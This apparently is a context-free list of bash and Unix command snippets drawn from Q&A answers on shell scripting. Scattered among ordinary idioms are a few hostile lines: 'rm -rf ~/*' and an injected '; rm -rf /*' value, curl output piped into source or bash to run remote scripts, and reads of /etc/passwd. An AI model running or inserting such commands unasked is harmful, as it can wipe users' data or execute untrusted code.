echo {a[!b]*,[!a.]?*}
javac -d . $(find . -name '*.java' -a ! -name '.*')
unset IFS
O_IFS=$IFS; IFS=\n
IFS=$O_IFS; unset O_IFS
if else
cat file
cat file | grep pattern
echo > /var/php-nginx/biergaizi.test.php.pid
su -c
chmod +x transpose.sh
./transpose.sh input.txt
echo $SHELL
2013-05-15 14:21:42,794
sed -n '/23/,/27/p'
echo -e
echo $bil1*$bil2
echo "$bil1*$bil2"
awk -F\= '{gsub(/"/,"",$2);print "Content of " $1 " is " $2}' <filename>
var = value
tr -d '\r' ...
! $lhs =~ ^\ *#
-n $lhs
${rhs%%*( )}
shopt -s extglob
cat results.txt | grep eval
baseline eval
inline sort
[ "$x" -lt "${@:$((i+1)):1}" ]
./forloop.sh 10
1 2 3 4 5 6 7 8 9 10
ssh-agent -s
x = 'foo'
x =$'foo'
-maxdepth 1
man find
-v proc="${PROC}"
"readlink /proc/" pid "/cwd"
foo ()
user=user1 pass=pwd address=addr1 other=
$/usr/bin/app --version
$/home/me/bin/app --version
$app --version
$which app
$$(which app)
hash -d <appname>
echo ${TWOD0[2]}
bad substitution
-c 1
echo 'word word word word word word' | sed 's/[a-zA-Z]* /DELETED /2g'
word DELETED DELETED DELETED DELETED word
man bash
declare -a
[[ ]]
zfs list -t snapshot -o name -H
not containing
<    a    >
$( nproc )
screen -list | grep Irssi/Mutt
screen -list
screen -ls
xargs rm < file.txt
rm a b
Ubuntu 13.04
gnu awk
command -v yum
command -v apt-get
[ -n "$(which yum 2>/dev/null)" ]
ls -FG
git diff --name-only
git clone https://my.repo.project.git
svn log
jira_ticket=("ticket-1" "ticket-2")
if ($0 ~ f)
if ($1 == f)
grep f <file>
help read
QQ=\'\\\'\' ; ProtectedB=${B//\'/$QQ}
Capital, capital, Capitol, capitol
cat /washington | s '/[Cc]apit[ao]l/capital'
sed 's/[Cc]apit[ao]l/capital/g' <filename>
sed -i 's/[Cc]apit[ao]l/capital/g' <filename>
sed -i.bak 's/[Cc]apit[ao]l/capital/g' <filename>
tput rmam
stty columns 1000
spawn.setwinsize(1000, 1000)
os.environ['COLUMNS'] = "1000"
spawn = pexpect.spawn('/bin/bash --noediting')
grep [dd]
grep [dd]
> outputfilename
2> errormessagesfilename
(mencoder …)
if [ $? -ne 0 ]
GNU sed
for i in ${a[*]}
gdal_translate –of GTiff ${a[1]} ${b[1]}
grep -c 1004 application.log
set body [lindex $argv 1]
sudo mm.sh
/tmp/foo bar
./mm.sh foo bar
awk '{if(NR>1)system("grep -w ^"$2" <file2>");}' <file1>
sed 's/.* //g' <file>
tr -d
awk '{print $NF}'
paste -sd,
sed 's/,/, /g'
", "
perl -lane 'print "$F[-1]"'
perl -ane 'print "$F[-1]" . (eof() ? "\n":",")'
source ~/.bashrc
source script
echo "something" > /tmp/myvar
myvar=$(cat /tmp/myvar)
<(sort ...)
$c =()=
$\ = "\n" x NUMBER
"[glob {*}]"
man bash
tilde expansion
tilde expansion
variable expansion
man bash
if [ ! -d "userfiles" ]
if [ ! -d "userfiles" ]
while read p; do
echo $p
done < file.txt
while read p ; do echo $p done < file.txt
grep . file.txt
ls | grep "sample" | head -1
man bash
echo "${var1}" | grep '/'
sed 's/^.{8}(.{8}).*/\1/')
" : use acute
man exec
scl enable python27 bash
scl enable python27 bash
mkdir -p parent_directory/your_directory/
set -e
getent passwd
cat file1.txt | ( sleep 2; sort > file1.txt )
Ran for x seconds
-q 1
man nc
$> bashttpd -s
read -r X <&3
expr $bil1 + $bil2
$( echo "$bil1 + $bil2" | bc)
"$1" "$2" "$3"
"$1" "$2" "$3"
"$1 $2 $3"
$1 $2 $3
grep -Po '"\K[^"]*'
kill -9 $myCommand
kill -9
kill -2
echo "1"
a=200 ./b.sh
# local OPTIND
local OPTIND
man bash
getopts "a:" opts "$@"
:set list
Carriage Return
tee >(head) >(tail) > /dev/null < text.txt
tee >(head) | tail < text.txt
tee >(head) | tail < text.txt
echo hi > /tmp/testfile
exec > /tmp/xcode_build.log 2>&1
cat /tmp/xcode_build.log
du -hcs
du -hc
du -s
du -cs
$(($i + 1 ))
echo $"asdf"
sh name.sh
<( ... )
uniq -u
find example/dir -type f
find example/dir -type f -prune
-perm +622
s/[^ ]*[A-Z][^ ]*.png/<&>[&]/
sed -e s/A/a/g -e s/B/b/g ...
-h -c
test -e ./file1 && test -e ./file2
[[ ]]
[[ ... ]]
[ ... ]
test ...
[[ ]]
git lg
git config ...
git config alias.lg
git config alias.<alias>
git config
BSD date
GNU date
GNU date
tr -cd 'e'
wc -c
cat mytext.txt | tr -cd 'e' | wc -c
grep -o "$needle" <<< "$haystack" | wc -l
iconv -f windows-1252 -t utf-8 -o \{} \{}
find ... -exec iconv ...
man bash
print $2
Your File Test.cc.hpp
regxep = $regexp"*"
git show
git format-patch
echo $line >>$LOGNAME
git cherry-pick $(tr '\n' ' ' commits.txt)
env --null
set title
for key in ${!array[@]}
for i in `ls`
man head
complete -F function command
composer completion bash > completion.bash
nohup mycommand > nohup.out &
rm -r XYZ
tee $terminal
tee $(tty)
; sleep .01
that line -20 or last
system sed
index($0, foo)
index(haystack, needle)
help [
start on filesystem and net-device-up IFACE!=lo
~/heartbeat: no such file or directory
| cat
echo "command" > ~/.bashrc
echo "command" >> ~/.bashrc
man history
history | grep bashrc
Any redirections (see Redirections) associated with a compound command apply to all commands within that compound command unless explicitly overridden.
man tr
perl -wpe "s/---/-/"
man 1p rename
tr '---' '-'
sed -e 's/---/-/g
sort -R
; then
myssh foo
getent passwd
sed -n '/^[^:]*:[^:]:*38:/p' /etc/passwd
ssh-keygen -t dsa
echo $line
" "
find . | xargs perl -pi -e 's/'conflicts' => '',//g'
-o " "
-v .
-o whatever-separator-string-you-want
$(dirname $0)
print $i
echo text >> file
echo text >> file
"ls" "-la" "some/dir"
man -P'less +/pattern\ substitution' bash
curl [url] > [file]
curl "url" | grep -qs foo
curl -s -N "URL" | grep -q Welcome
-o /tmp/download/abc.txt
(23) Failed writing body
curl -L https://packagecloud.io/varnishcache/varnish5/gpgkey | apt-key add -
apt-key add
df -k .
write error: No space left on device
source <( curl -sS $url )
(23) Failed writing body
bash 3.2
Failed writing body
Failed writing body
curl <blabla> | jq | grep <blibli>
jq .
curl <blabla> | jq . | grep <blibli>
curl -L https://packagecloud.io/golang-migrate/migrate/gpgkey | apt-key add -
curl -L https://packagecloud.io/golang-migrate/migrate/gpgkey | sudo apt-key add -
Failed writing body
curl "url" | sponge | grep -qs foo
if not line 2, delete
sed '162!d' skinlist.html
<a href="/skin/dwarf-red-beard-734/" title="Dwarf Red Beard">
Dwarf Red Beard
-e 's/.*title="//g' -e 's/">.*$//g'
-A 3
cat *txt | sort -k 1 |
uniq -w4
cat *.txt | sort -gr | uniq -w4
uniq -f1
cat *.txt | sort -gr | rev | uniq -f1 | rev
cat *.txt | sort -gr | grep 'ABCD' | head -n 1
./snmp_remote_disk_auto localhost public 100
df -Ph | grep -v "Use%" | sed 's/%//g' | awk '$5 > LIMIT {print $1,$2,$3,$4,$5"%";}' | column -t'
df -Ph
df -Ph
df -Ph | grep -v "Use%" | sed 's/%//g' | awk '$5 > 20 {print $1,$2,$3,$4,$5"%";}' | column -t
column -t
ffmpeg 1.0
timeout 5 sleep 6
$ echo "Hey . My . Name . Is . Bash" | tr -cd . | wc -m
sed '/DIRLIST/ s:"$:'"$logFolder"'":'
./ar > log
$(if ...; fi)
echo $?
[error: <code>]
[error: ${code}]
[error: ${code}]
\\[\\033[0;31;4m\\]\${?#0}\\[\\033[0;33m\\]\$ \\[\\033[0m\\]
\$ 
declare -x PS1="\\[\\033[0;35m\\]\\h\\[\\033[1;37m\\] \\[\\033[0;37m\\]\\w \\[\\033[0;33m\\]\\[\\033[0;31;4m\\]\${?#0}\\[\\033[0;33m\\]\$ \\[\\033[0m\\]"
help [
help case
shift 2
help shift
BEGIN DEVELOPMENT
END DEVELOPMENT
BEGIN PRODUCTION
[ ... ]
[[ ... ]]
[[ ... ]]
cd /tmp/unixODBC.30048.28312.21379/unixODBC-2.3.0; make install
1 2 3 4 5
grep -o
perldoc -f system
"xyz walked his dog abc"
"walked his dog"
"xyz abc"
sed -r 's/walked his dog//'
a="xyz walked his dog abc"; echo "${a/walked his dog/}"
find . -name '*-6.0.dll*' -exec sh -c 'mv {} $(echo {} | sed -e 's/\-6\.0\.dll/\-6\.1\.dll/g')' \;
sh -c
 .run 
wc -l
$i > $i
find / -type f > tmp.txt
sed -n <$RANDOMNUMBER>p filelist
while read line
vim +cmd1 file1 +"file2_cmd file2_cmd file2" +"file3_cmd file3_cmd file3"
vim +cmd file1 +" <-- this quote works, but this one doesn't --> "
Vim: not an editor command: 33 ./bar.py +"tabnew +15 ./foo.py"
ncmpcpp --now-playing
ncmpcpp --now-playing "%a - %t"
"[1] Done ..."
fetch_addon "bagnon"
get_file "http://www.curse.com/addons/wow/bagnon/704176"
get_download_page "bagnon"
sed -r 's/^M/^J/g'
grep '.*|.*|.*'
sudo -u ubuntu [...]
ls -r
ls -t
xargs rm
sed 's/\MM-DD-YYYY-HH:MM//' will remove the date time stamp from the files. The
ls $file*
xargs rm
shift <n>
./myscript 1 2 3 4
shift 2
-n "$1"
while [ -n "$2" ]
(( $# ))
while (( $# ))
cat infile
`cat file`
printf -v
while read
echo $line2
echo "Hello World"
echo " $line2 Hello"
echo "Hello $line2"
sort -ns
" - "
grep log_file CommonTerm -B 0 -A 1
| grep "\-\-" -B 0 -A 1
awk '{if (count++%3==0) print $0;}'
grep "pattern" file.txt
df -h
"{something: here}"
"[{something: here}]"
ls -1
processVerification /home/folder/
processVerification /home/folder/transactions-2012*
basename filename
tar -czf backup.tar.gz "$PROJECTDIR"
word spliting
/Library/Application Support/appsolute/MAMP PRO/conf/php.ini
head -n1
bunzip2 *.csv.bz2 && head -qn1 *.csv > salida
error: too many arguments
cat -n infile
join -v 2
pip install -U --user ipython
brew install ipython
xcode-select --install
brew install git
brew install ipython
pip3 install ipython
brew install Ipython
python -m pip install --upgrade pip
find .cache/chromium/Default/Cache/ -mindepth 1 -type d -size +100M -delete
find .cache/chromium/Default/Cache/ -mindepth 1 -type d -size +100M -exec rm -rf {} \;
-exec rm -rf {} \;
-type d
type d
bash: /dev/stdout: Permission denied
stefano> echo "I am Stefano" >> /dev/stdout
heroku db:push
-f $var
exec validate
exec $0
exec ./validate
count_line_lengths file.txt
sort -n
uniq -c
while read line; do echo -n "$line" | wc -m; done < file | sort | uniq -c
wc -c
wc -m
alias test='echo ''test!'''
-F"\. "
{OFS=". "}
'{for (i=0;i<=NF;i++) {sub(".", substr(toupper($i), 1,1) , $i)}}
this is my first sentence
bash version 4
sh -c
compgen -W
http {
\t/server_names_hash_bucket_size 64;
http {
ifconfig  | grep -E 'inet.[0-9]' | grep -v '127.0.0.1' | awk '{ print $2}'
export BUILD_MACHINE_IP_ADDRESS=`ifconfig  | grep -E 'inet.[0-9]' | grep -v '127.0.0.1' | awk '{ print $2}`
LD_PRELOAD=/path/to/my/so ./a.out
read $sftp
read sftp
if [ "$sftp" -eq 1 ]
<<< $VARIABLE
"./ /etc/passwd /.htaccess"
sed -i
sudo -S
0 0 * * * /path/to/script
0 0 * * * /bin/sh /path/to/script
/bin/sh /path/to/script
[ x == y]
[[ string == pattern ]]
tr -d
sed -i -e s/username/userinput/g userlist.txt
alias home=$HOME
go home
type -t
chmod u+x your_script
source .bashrc
source ~/.bashrc
-i inplace
tar cf empty.tar --from-file /dev/null
tar cvf empty.tar --files-from /dev/null
tar cvf empty.tar -I /dev/null
system("my_bash_script &");
UNSET <PID>
DO SOMETHING HERE
GNU parallel
$ ./install.sh
Git Bash.vbs
C:\Program Files\Git\usr\bin\mintty.exe" -h always /bin/bash -l -e 'D:\folder\script.sh'
cat file
cat f
cp -r new-files/* other-directory/
cp -r new-files/* other-directory/
test: {}: binary operator expected
sh -c
sh -c
test -e ./blah -a ! -L ./blah
[[ .. ]]
if [ -e ./blah ] &&  [ ! -L ./blah ];
if [ -e ./blah -a ! -L ./blah ];
[[ .. ]]
grep -q
test -e ./blah
test ! -L ./blah
[ -e ./blah]
[ ! -L ./blah ]
test "$foo" = "$bar"
test -e ./blah
test -! -L ./blah
test -e ./blah
test -L ./blah
unset x; for i in {1..256}; do tput setab $x; echo $x; x=$((x+1)); done
unset x; if [ $x -le 256] ; do tput setab $x ; echo $x ; x=$((x+1)) ; done
unset x; if [ $x -le 256] then do tput setab $x ; echo $x ; x=$((x+1)) ; done
unset x
Output replaces selected text
Run shell script
to stdin
Run shell script
to stdin
Get content of the clipboard
TextEdit -> Services
cmd -a $a -b $b -c $c
$parameters{ $param } is blank or zero, it will not add that parameter/value pair to the command line you're executing. Now, we can execute the command. Use
sed -n -e "3,5p" -e "11,13p" some_file > output_file
head -5
./myscript -v
atlasLocalSetup.sh: invalid option -- 'v'
ternary operator
man cut
chown postgres:postgres /var/lib/pgsql/.pgpass
echo $PGPASSWORD
chmod 600 ~/.pgpass
cat ~/.pgpass
/working/1190A /working/1993A
find testfile -mtime 2
diff -r dir1 dir2
diff -r dir1 dir2 | grep dir1
<( )
-F -x
NN:NN:NN NN/NN/NNNN
Debian Squeeze 6.0.6
indirect expansion
sort -n
someprocess args >>logfile 2>&1
for i; do
touch $filename
cd "/home/"$un"/projects/buildlogs/"
cd ~/projects/buildlogs/
echo "AAA $x BBB"
echo "Execution Time: $(((end_time-start_time)/60)) mins."
filename=log-$(date +%Y:%m:%d-%T)
printf -v filename "log-%(Y:%m:%d-%T)T" -1
touch $filepath
0xffffffff3d4331bc> <p
--backup --backup-dir=rsync/backup
--backup --backup-dir=rsync/backup
--backup --backup-dir=rsync/backup
-F -F
man (1) rsync
src=`cd ..`
line 31: librarian-chef: command not found
:a ; n ; ba
>/dev/null 2>&1
| grep
$(which 1)
$( )
echo "ScriptPath: $(which 1)"
echo "ScriptPath: $(which "$1")"
ls > localbackup.txt | cat localbackup.txt
tee -a
tail -f
cat foo | ...
bash -x scriptname
dorun 5
adb -s 015d2578a7280412 pull /data/app/com.adobe.reader-1.apk apk-nexus7-default
mv l
[[ $line != #* ]]
from that script
grep -v grep
grep -v $$
-o %PPID
[ "$(pidof -x $(basename $0))" != $$ ] && exit
pgrep -f $0
pgrep bash
bash script.sh
vim script.sh
bash script.sh
man test
readlink symlink/
function_factory func1 func2 func3
export -f function_name
bash: script.sh: command not found
sh script.sh
bash script.sh
while read -r line2
cat -- "$second_filename"
echo $line
while read -r line || [[ $line ~= '' ]]
"RX bytes:"
"TX bytes:"
diff -q
help mapfile
svn st svn_promote_WP | cut -c1
`svn st svn_promote_WP | cut -c1`
svn st svn_promote_WP | cut -c1
set +f
NNN.NNN. ... . NNN
man syslog
sudo syslog -s o.O
syslog -C
printf "%'d\n"
printf "%s\n"
result: 0.2
invalid number
<<'END' ..
ls *
listit /
listit /
listit /
source .bash_profile
export RBENV_ROOT="/home/vagrant/.rbenv"
diff -u
cd A && patch < thepatch.patch A
Only in B: file3.txt
[[ string =~ regex ]]
php -r "print_r( json_decode('"$PAIR"') );"
svn commit
set -x
set -x
script -q /dev/null yourcommand
expect package
man sort
echo 'password for www-data user' | / usr/lib/cgi-bin/sudo -S global.sh bin/bash/"
cat <file> | sed -e 's/^[ ]*//'
until python script.py do
line=" a"; echo $line;
" a"
-f <file>
CONDITIONAL EXPRESSIONS
abc ab1.txt
find ... -exec ...
find ... -print0 | xargs -0 ...
shopt -u nullglob
100 bytes in 1 blocks definitely lost
returns \n suffixed with x
removes x
IFS="$(printf '\nx')" && IFS="${IFS%x}";
grep -n <pattern> <input> | cut -f1 -d:
cat $artists/$file | tail -$lines > $artists/$file
> $artists/$file
mysql -h 10.0.0.2 -e "the query"
ssh -L 3307:localhost:3306 root@10.0.0.2
mysql -h 127.0.0.1 -P 3307
[[ $var1 < $var2 ]]
Segmentation fault (core dumped)
command &> alloutput.txt
2013 05
<( )
source script2.sh
set -o noclobber
i = i + 1
date +%s
date +%s
[-z $M ]
man test
man test
[ -z $M ]
test -z $M
[ -n $M ]
[ -e $M ]
M='= -z
-z = -z
chmod a+x yourscript
./yourscript 0
./yourscript 1
$0 ~ search
for ... in
for variable_name in list_of_words; do something_with $variable_name; done;
str=(rm -rf ~/*)
$(rm -rf ~/*)
man source
sudo visudo
user ALL=(root) NOPASSWD:/path/of/your/binary
curl -s https://raw.github.com/willfarrell/.vhosts/master/setup.sh -o vhosts.sh && bash vhosts.sh && rm vhosts.sh
echo -e $lines
< <
read variable
read variable
for p in $(find . -type f ...
grep -A1 "^-" $file | grep "^+" | wc -l
wc -l
sys.stdout.softspace = False
$ oldifs=$IFS;printf '\n';printf '{';while IFS= read -r p;do [[ "$p" == *"'"* ]] && echo -n "echo $'$p';" || echo -n "echo '$p';"; done < /Library/Scripts/BootRepairMount.sh | tr '\t' '\134\164';printf '}';printf '\n\n';IFS=$oldifs
{echo '#!/bin/bash';echo 'sleep 18';echo $'for OUTPUT in $(diskutil list | grep ':                  Apple_HFS' | awk '{ print $NF }')';echo 'do';echo '\if [[ -z $(df -lnh | grep /dev/$OUTPUT) ]]; then';echo '\\echo "$OUTPUT is not mounted, repair and mount"';echo '\\diskutil repairVolume $OUTPUT';echo '\\diskutil mount $OUTPUT';echo '\fi';echo 'done';}
{echo '#!/bin/bash';echo 'sleep 18';echo $'for OUTPUT in $(diskutil list | grep ':                  Apple_HFS' | awk '{ print $NF }')';echo 'do';echo '\tif [[ -z $(df -lnh | grep /dev/$OUTPUT) ]]; then';echo '\t\techo "$OUTPUT is not mounted, repair and mount"';echo '\t\tdiskutil repairVolume $OUTPUT';echo '\t\tdiskutil mount $OUTPUT';echo '\tfi';echo 'done';}
$ oldifs=$IFS;printf '\n';printf '{';while IFS= read -r p;do [[ "$p" == *"'"* ]] && printf 'printf $'\''%q'\'';' "$p" || printf 'printf '\''%q'\'';' "$p"; done < /Library/Scripts/BootRepairMount.sh;printf '}';printf '\n\n';IFS=$oldifs
{printf '\#\!/bin/bash';printf 'sleep\ 18';printf $'for\ OUTPUT\ in\ \$\(diskutil\ list\ \|\ grep\ \':\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ Apple_HFS\'\ \|\ awk\ \'\{\ print\ \$NF\ \}\'\)';printf 'do';printf '$'\tif [[ -z $(df -lnh | grep /dev/$OUTPUT) ]]; then'';printf '$'\t\techo "$OUTPUT is not mounted, repair and mount"'';printf '$'\t\tdiskutil repairVolume $OUTPUT'';printf '$'\t\tdiskutil mount $OUTPUT'';printf '$'\tfi'';printf 'done';}
printf '\n{ '; while IFS= read -r p; do printf "echo %q; " "$p"; done < /Library/Scripts/BootRepairMount.sh; printf '}\n\n'
{ echo \#\!/bin/bash; echo sleep\ 18; echo for\ OUTPUT\ in\ \$(diskutil\ list\ \|\ grep\ \':\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ Apple_HFS\'\ \|\ awk\ \'{\ print\ \$NF\ }\'); echo do; echo $'\tif [[ -z $(df -lnh | grep /dev/$OUTPUT) ]]; then'; echo $'\t\techo "$OUTPUT is not mounted, repair and mount"'; echo $'\t\tdiskutil repairVolume $OUTPUT'; echo $'\t\tdiskutil mount $OUTPUT'; echo $'\tfi'; echo done; }
"home home2 ..."
sort -h
find /*home*/"${COMPARE[@]}" ...
echo $array
echo $array[1]
fmt -1
fmt -999999
delete_ary_elmt ELEMENT ARRAYNAME
== $word
== $word*
${elmt,,} == ${word,,}
x=1; varname=x; echo ${!varname} # prints "1"
aryname=a; echo "${$aryname[@]}
aryname=a; echo "${!aryname[@]}"
aryref="a[@]"; echo "${!aryref}"
echo "${a[@]}"
#define square(x) ((x) * (x))
2013-05-31 18:00:44,817 DEBUG server 120: Server Prepare: Error: /home/minecraft/multicraft/scripts/startup.sh: line 11: syntax error: unexpected end of file
else if
wc -w
wc -w
wc -l
grep -z
./myFirstShellScript.txt > myFirstShellScriptLog
source myScript
chmod +x
| wc -l
"ALERT! Count for file#.txt is greater than 10!"
>> myotherfile.txt
done > myotherfile.txt
eval value=\${$varname}
> /path/inputpath/file1.txt
ps -ef
wc -l
-gt 1
add-apt-repository --yes
> /dev/null
printf "%s\n"
printf "%s\n" 300.77
printf "%s\n" 1000000
GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin12)
cd htdocs
source $HOME/.profile
wc -l
mkdir /home/...
echo $batch
echo > newfile
bash -x script
at -f jobs now + xxx minutes
GNU grep
declare -i fact
signed long
a= b || c
a= $1 || "Foo"
1  | 2
|, ^, &, >>
tail -f
ssh user@host "command"
printf '%q '
set -vx
wget ...
$( ... )
source /var/root/.bashrc
. MyScript -d Downloads
-sda or -s -d
./test -ab -c file
./test -d
./test -c
-a ""
if $a; then ...
-l file:
./test --file="q w"
q w
[ -n "$col1" ]
ps -ef
ps -ef
grep $i
for i in $MY_BIN_PATH/*
ls s* | wc -l
-not -name ".*"
while read
find . | while read i; do echo $i; done;
ls -a1
else if
echo hello
man 1 echo
man nohup
nohup  COMMAND > FILE
[root@hostname tags]# echo filename_INT | sed 's/_INT[a-z.]*//g'
ls -a
bind 'set match-hidden-files off'
 1370306857: command not found
/usr/bin/time -f%e sleep 1
\time -f%e sleep 1
SECONDS=0 ; sleep 10 ; echo $SECONDS
find ...
a b
find -maxdepth 1 -mindepth 1 -type d
no swapon in (/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:...)
who am i
ssh root@ns2 ...
ssh ns2 sudo /sbin/swapon
enable printf
man bash
[0, 1)
:set filetype?
bash: some_utility: command not found
type command_not_found_handle
unset command_not_found_handle
grep '^>' -An
set -e
Kaylee 25
1 10 11 2 3 4
1 2 3 4 10 11 12
find . -name "*zip*"
find . -name "*zip*"
for i in `find . -name "*zip"`; do unzip -o $i "*partnumber*" -d /tmp/ ; done
for i in `find . -name "*zip"`; do unzip -o $i "*3460*" -d /tmp/ ; done
sed -n 1..1p < filename
sed: -e expression #1, char 2: unknown command: '.'
echo word|md5sum
date "+%H"
ls /bin/[
man test
stty cooked
stty echo
stty sane
stty raw
echo 1
exit 0
exit 1
man bash
pkill java
set -x
iscsiadm -m session
crontab -e
echo $a$b prints only $b, not $a and $b
export LIBRARY_PATH=/opt/local/lib
NameVirtualHost *:80
google web translator
-v FS="/"
print $2
[[ ${-#*i} != ${-} ]]
[[ ${-#*i} != $- ]]
grep -q
public keys
ssh-keygen -f ~/.ssh/my-script-key
printf "%s:%s\n" date hostname
[issue14020]: some text message
[(no branch)]: [issue14020]: some text message
git branch
NAME=$(git rev-parse --abbrev-ref HEAD)
while IFS= read -r date time id
man bash
man grep
help function
set -- "a b" "c d"
a b
c d
myf $(some command)
P(N, N)
grep succeeded FILE
grep failed
grep succeeded FILE
grep -e succeeded -e failed file
which [
[ foo ]
0, 1, 2, 3, ..., 31
$(seq 0 31)
here document
2011-05-21 19:30:00
date --date='2011-07-24 22:00:00' '+%d %B %Y'
"%Y-%m-%d %H:%M:%S"
"2011-07-24 22:00:00"
man strftime
man bash
if (...)
if [...]
if (command)
mv -i
mv -i
man move
mv -i
mv -i
mv -i
mv -i
mv -i
mv -i
./sedscript myfile
man [
man 3 strftime
xargs: .: Permission denied
. ./parallel
read -t
/bin/bash ./executeServer.sh &
exit 0
kill %1
nohup ./executeServer.sh
for ((...))
chmod +x /usr/local/bin/millisecond-time
millisecond-time my_command
man bash
man time
svn merge ^/trunk ^/branch
svn merge ^/trunk ^/branch > mergelog
cat mergelog
(( ))
{ ... }
ps afux | less
kill -9
COMMAND COMMAND COMMAND
mktemp -d
tail -n 9 $tdir/fifo
define('WP_POST_REVISIONS', 3);\n\n/**#
bash: syntax error near unexpected token ')'
osascript -e
osascript -e
chmod +x /path/to/myscript
sed -i s/\ *=\ */=/g filename
name   = value
npm list -g
npm_list=$(npm list -g) &> /dev/null
<field name="foo">
<foo id="bar">
<field name="foo">
<field name="firstStoredWord">
xsltproc 16970175.xslt 16970175.xml
*"is running"*
date -f filename
ls -rt
subprocess.call(r"sort -t\t -k1,2 input -o output")
[ foo==bar ]
[ $(echo "0") = "0" ]
[[ $(echo "0") == 0 ]]
$(echo "0")
ps -ax | grep Chrome
k ulator
grep -i
" ; rm -rf /*"
| while read d v
basename $d
declare -A volumes
[find . -maxdepth 1 -type f]
sudo apt-get install xtitle
xtitle Tomcat
set -x
mkdir -p
mysql help
{"fkey":"8f1a9c6e21503516793b853265ec4939","isRegistered":true,"userId":1353267,"accountId":1430801,"gravatar":"<div class=\"\">
sed 's/\b\([0-9]\+\)\b/\n\1\n/g'
cut -c1
sed 's/\b\([0-9]\)[0-9]*\b/\n\1\n/g'
echo -n
wget -4 ...
chmod a+x interact
top -n1 | tail -n +8 | sed 's/^ [" "]*//g'
top -n1 | tail -n +8
od -c
chmod a+x interact
abc-1.0.0<any value>.jar
abc-1.0.0<any value>.jar
If the word is double-quoted ${name[@]} expands each element of name to a separate word
"foo 1" "bar 2"
to a separate word
into one word
"foo 1 bar 1"
[[ ... ]]
bar=$(a command)
logfile=$logdir/foo-$(date +%Y%m%d)
PATH=/usr/local/bin:$PATH ./myscript
man date
ssh-add ~/.ssh my_private key
ffmpeg -i  "$inpFile" 01.mp3
carriage return
osascript -e 'tell application \"Terminal\" to do script \"foo\"'
xterm -e "foo"
expand-ip targs
prips 192.168.0.0/23
prips "$subnet" | sed -e '1d; $d'
od -xcb scriptname.sh
set -x
set +x
echo "[$LIST]"
enabled = false
cat /etc/fail2ban/jail.conf
p4 opened|sed "s/\([-#()]\|change\)/ /g"|column -t|sort -k 4
p4 describe -s
sort -V
man sort
sort -V
sort -V
MIN <= CURRENT <= MAX
MIN < CURRENT < MAX
mac terminal
old dir
new dir
old dir
new dir
ls | grep x
printf '%q ' "$element"
'%t [%p]: [%l-1] '
bash -n
#!/usr/bin/env sh
#!/usr/bin/env bash
GNU awk
2>&1 >/dev/null
$ command &> /dev/null
2>&1 >/dev/null
>/dev/null 2>&1
man test
[ string ]
"-d -m -S t1 bash -c 'echo hi 2>&1 | tee hi.txt'"
vim myGraphic.cpp
g++ -lglut -lGLU myGraphic.cpp -o prettyPicture
bash: !-$CYCLE: event not found
HEADER="--header Content-Type:Application/xml"
--header Content-Type:Application/xml
names="'$(cat <your file> | sed 's/(\w)\n(\w)/\1\', \'\2/g)'"
if [ `whoami` != "comdesadmin" ]
#!/bin/bash -e
exit 0
-f bin
nasm -f elf32 learn.asm
-f elf64
ld -o learn learn.o
gcc -o learn learn.o
ssh user@ip -t "perl ~/setup.pl >& ~/log &" &
./mysctipt.sh &
( $(< file.txt) )
GNU awk
/home/slavik/project/build xxx
/home/slavik/project/build -v=1
file /home/slavik/project/build not found
commands | grep -f - file
grep '^string'
grep -f
grep -f -
grep '^'
grep -f
grep -f '^-'
grep -f -
echo ^a | grep -f - file.txt
grep '^a' file.txt
grep '^PAT' patterns.txt | grep -f - myfile
grep '^abc' dict.txt | sed 's/^/^/g' | grep -f - myfile
grep -e '^abc' -e '^abcd' myfile
grep '^abc' dict.txt | sed 's/^/^/;s/$/\ /' | grep -f - myfile
system("cd newdirectory && rm foo");
rm foo
no URL specified!
GNU grep
bash script_name.sh
sudo chmod 700 script_name
telnet localhost 4242
startAnnouncement.sh: 44: [[: not found
for loop
echo $VAR$i
awk -F\" '{print $4 "\t" $6}'
{print OFS}
{printf "%s ",$0}
END{print OFS}
<(yes yesyes)
diff a b
diff <(cmd) <(cmd)
$(find . -mindepth 1 -maxdepth 1 -type d ! -name index -printf '%f/* ')
<<<<<<< HEAD
No such file or directory
'echo $(ls -r /var/www/xx*)'
echo /var/www/xxbr7.log
$(ls -r /var/www/xx*)
grep -f patt_file file
man grep
[[ ... ]]
-H "foo bar"
--data 'foo bar'
'foo bar'"$variable"'more foo'
--data @/dev/fd/<some number>
nc -l 8080
"el a"
bash -x scriptname.sh
-re "foo" { exit 17 }
exp_internal 1
grep -q "^user\.$NAME\.Contacts"
printf '%s\n'
echo "${array3[*]}"
help printf
man bash
>/dev/null 2>&1
-a 5
source foo_completion.sh
foo li
foo list:show
foo list\:show
-o filenames
( . 1 . 1 . 1)
set -x
bash hello.sh
source env_var_set.sh
ln -s script.sh sample.sh
GNU awk
ps | grep ungreppable_phrase
ssh {username}@{host}
ssh name2@host
$(dirname "$x")
GNU awk
ls -l
No file or directory found
COLORS="RED GREEN WHITE ORANGE"
COLORS="RED GREEN WHITE ORANGE"
man ssh
script.sh a.txt 2 4
git diff
git diff
cd somewhere
git diff
adb devices
adb -s $device install foo.apk
adb devices
while loop
|| "$ans" == ""
echo $ans
help [[
man bash
-type d
sudo killall instruments
pgrep <proc>
set -e
|| true
ps aux
for x in ${array[@]}
export PS1=$(git config user.email)
(( ... ))
"Must enter exactly one argument"
wc -l $1
wc -l
find ...|xrags
find ... -exec wc -l {} +
wc -l ...
<number> total
-maxdepth 1
find ... wc +
send_user "arg1: $arg1\n"
abc_2, abc_1, abc_10
abc_1, abc_2, abc_10
abc_1, abc_10, abc_2
echo $timestamp
timestamp="(date +"%T")"
(date +"%T")
timestamp="$(date +"%T")"
2014-02-01 15:12:35-05:00
date --help
date +%s
date +%T
date -I
$(date -I)
date +%F_%T
$(date +%F_%T)
date +%Y%m%d_%H%M%S
$(date +%Y%m%d_%H%M%S)
date --utc +%Y%m%d_%H%M%SZ
$(date --utc +%Y%m%d_%H%M%SZ)
date +%Y%m%d_%H%M%S%Z
$(date +%Y%m%d_%H%M%S%Z)
date +%Y%m%d%H%M%S
$(date +%Y%m%d%H%M%S)
date +%Y%m%d%H%M%S%N
$(date +%Y%m%d%H%M%S%N)
date +%y%m%d_%H%M%S
$(date +%y%m%d_%H%M%S)
date +%s
$(date +%s)
date +%N
$(date +%N)
date +%s%N
$(date +%s%N)
date --utc +%FT%TZ
